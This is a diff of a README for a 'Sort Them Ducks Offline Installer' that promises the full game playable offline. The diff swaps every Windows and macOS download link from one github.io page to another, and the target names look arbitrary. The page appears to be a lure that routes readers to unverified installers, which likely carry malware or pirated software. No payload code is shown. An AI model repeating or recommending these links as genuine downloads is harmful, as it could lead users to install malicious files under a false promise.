@@ -1,8 +1,8 @@
 # Sort Them Ducks Offline Installer
 
-[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://spearsurvive.github.io/win/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://spearsurvive.github.io/win/)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
 
 > Sort Them Ducks Offline Installer — full game, all puzzles and worlds, plays without internet.
 
@@ -12,8 +12,8 @@
 
 | Platform | Link | Size |
 |----------|------|------|
-| **Windows** | [Download Installer](https://spearsurvive.github.io/win/) | 1 GB |
-| **macOS** | [Download Installer](https://spearsurvive.github.io/mac/) | 1 GB |
+| **Windows** | [Download Installer](https://zenboulderagora.github.io/Windw/) | 1 GB |
+| **macOS** | [Download Installer](https://zenboulderagora.github.io/macdw/) | 1 GB |
 
 ---
 
